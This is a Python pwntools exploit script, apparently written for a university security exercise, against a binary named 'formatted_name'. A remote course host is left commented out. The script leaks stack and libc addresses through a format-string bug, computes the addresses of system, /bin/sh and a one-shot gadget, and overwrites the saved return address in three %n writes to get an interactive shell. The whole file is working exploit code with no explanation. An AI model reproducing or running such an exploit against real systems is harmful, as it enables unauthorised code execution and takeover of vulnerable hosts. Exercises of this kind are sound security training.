import socket
import struct
import telnetlib
from pwn import *

#s = remote("tpas.alunos.dcc.fc.up.pt", 5011)
s = process("./formatted_name")


#gdb.attach(s, ''' ''')

s.recvuntil("> ")

s.send('1\n')

s.recvuntil("Name: ")

sploit = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n"
s.send(sploit)
s.recvuntil("> ")

s.send('2\n')

leak = s.recvuntil("> ")

print leak
srbp = leak[190:204] #remote
#srbp = leak[201:215]

libc_write_nocancel = leak[42:56]

srbp = int(srbp, 16)
print "[+] Got saved rbp at " + hex(srbp)
retaddr = srbp - 0x8
print "[+] Got retaddr at " + hex(retaddr)

libc_write_nocancel = int(libc_write_nocancel, 16)
print "[+] Got libc_write_nocancel at " + hex(libc_write_nocancel)
system = libc_write_nocancel - 0xb1f00
print "[+] Got system at " + hex(system)
binsh = system + 0x147987
print "[+] Got /bin/sh at " + hex(binsh)
oneshot = system + 0xaaee4
print "[+] Got one-shot-rce at " + hex(oneshot)

lsb = hex(oneshot)[10:14]
print lsb
lsb_int = int(lsb, 16)
print lsb_int

msb = hex(oneshot)[6:10]
print msb
msb_int = int(msb, 16)
print msb_int

hsb = hex(oneshot)[2:6]
print hsb
hsb_int = int(hsb, 16)
print hsb_int

s.send('1\n')

s.recvuntil("Name: ")

payload1 = 'AAAA%' + str(lsb_int-4) + 'u%10$n'
payload1 += struct.pack("<Q", retaddr)
s.send(payload1 + '\n')
print payload1

s.recvuntil("> ")

s.send('2\n')

s.recvuntil("> ")

s.send('1\n')

s.recvuntil("Name: ")
payload2 = 'AAAA%' + str(msb_int-4) + 'u%10$n'
payload2 += struct.pack("<Q", retaddr+2)
s.send(payload2 + '\n')
print hex(retaddr+2)

s.recvuntil("> ")

s.send('2\n')

s.recvuntil("> ")

s.send('1\n')

s.recvuntil("Name: ")
payload3 = 'AAAA%' + str(hsb_int-4) + 'u%10$n'
payload3 += struct.pack("<Q", retaddr+4)
s.send(payload3 + '\n')
print hex(retaddr+4)

s.recvuntil("> ")

s.send('2\n')

s.recvuntil("> ")

s.send('3\n')

s.interactive()
